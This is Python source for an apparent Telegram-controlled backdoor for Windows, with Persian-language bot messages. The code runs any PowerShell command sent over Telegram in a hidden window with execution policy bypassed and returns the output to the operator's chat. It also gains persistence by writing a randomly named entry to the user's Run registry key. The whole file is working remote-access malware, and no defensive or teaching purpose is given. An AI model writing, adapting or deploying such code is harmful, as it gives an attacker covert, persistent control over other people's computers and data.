import subprocess
import telebot
from telebot import types
import winreg
import uuid
# https://t.me/rmsup  https://t.me/secbaz
TOKEN = 'TOKEN'
bot = telebot.TeleBot(TOKEN)
is_system_command = False
current_chat_id = None

def run_powershell_command_hidden(command):
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        result = subprocess.run(['powershell.exe', '-ExecutionPolicy', 'Bypass', '-Command', command], capture_output=True, text=True, check=True, startupinfo=startupinfo)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
        return None

def generate_random_registry_key_name():
    return str(uuid.uuid4())[:8]

def add_to_registry_on_startup(program_path):
    try:
        key = winreg.HKEY_CURRENT_USER
        sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        registry_key = winreg.OpenKey(key, sub_key, 0, winreg.KEY_SET_VALUE)
        registry_key_name = generate_random_registry_key_name()
        winreg.SetValueEx(registry_key, registry_key_name, 0, winreg.REG_SZ, program_path)
        winreg.CloseKey(registry_key)
        print(f"برنامه با موفقیت به رجیستری با نام '{registry_key_name}' اضافه شد.")
        return registry_key_name
    except Exception as e:
        print(f"خطا در اضافه کردن به رجیستری: {str(e)}")
        return None

@bot.message_handler(commands=['start'])
def send_welcome(message):
    global current_chat_id
    current_chat_id = message.chat.id
    markup = types.ReplyKeyboardRemove()
    bot.reply_to(message, "سلام رفیق! به ربات کنترل PowerShell خوش اومدی.", reply_markup=markup)
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    button = types.KeyboardButton('اجرای دستورات پاورشلی')
    markup.row(button)
    bot.send_message(message.chat.id, "برای شروع ربات دکمه زیر رو انتخاب کن👇", reply_markup=markup)

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    global is_system_command

    if message.text == 'اجرای دستورات پاورشلی':
        bot.reply_to(message, "لطفاً دستور خود را برای اجرا وارد کنید.")
        is_system_command = True
    elif message.text == 'پایان عملیات':
        bot.reply_to(message, "عملیات به پایان رسید.")

        is_system_command = False

        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        button = types.KeyboardButton('اجرای دستورات پاورشلی')
        markup.row(button)
        bot.send_message(message.chat.id, "عملیات به پایان رسید. برای شروع دوباره دستورات پاورشلی، دکمه 'اجرای دستورات پاورشلی' را بزنید.", reply_markup=markup)
    else:
        if is_system_command:
            powershell_command = message.text
            output = run_powershell_command_hidden(powershell_command)
            if output:
                bot.send_message(current_chat_id, "نتیجه اجرای دستور:\n" + output)
            else:
                bot.send_message(current_chat_id, "اجرای دستور PowerShell با شکست مواجه شد.")

            markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
            button = types.KeyboardButton('پایان عملیات')
            markup.row(button)
            bot.send_message(current_chat_id, "برای پایان دادن به عملیات، دکمه 'پایان عملیات' را بزنید.", reply_markup=markup)

program_path = r"C:\path\to\your\program.exe"
registry_key_name = add_to_registry_on_startup(program_path)

bot.polling()
